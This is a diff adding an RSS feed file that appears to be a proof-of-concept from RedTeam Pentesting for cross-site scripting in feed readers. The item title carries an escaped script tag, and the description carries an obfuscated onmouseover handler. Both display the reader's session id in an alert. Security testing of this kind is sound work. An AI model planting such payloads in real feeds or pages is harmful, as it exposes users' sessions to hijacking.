@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+<channel>
+    <title>RedTeam Pentesting</title>
+    <link 
+      href="http://www.redteam-pentesting.de" 
+      rel="self" 
+      type="application/rss+xml" />
+    <link>http://www.redteam-pentesting.de</link>
+    <description>Seeing your network from the attacker's perspective</description>
+    <pubDate>Mon, 16 Apr 2009 05:23:42 +0000</pubDate>
+    <language>de</language>
+    <item>
+      <title>&lt;script&gt;alert('Title: Your session id is: ' + window.top.sSID);&lt;/script&gt;</title>
+      <link>http://www.redteam-pentesting.de/pentest</link>
+      <pubDate>Mon, 16 Apr 2009 05:23:42 +0000</pubDate>
+      <description>
+        &lt;div o&lt;xml&gt;nmouseover=&quot;alert('Description: Your session id is: ' + window.top.sSID)&quot;&gt;
+          RedTeam Pentesting XSS
+        &lt;/div&gt;
+      </description>
+    </item>
+  </channel>
+</rss>
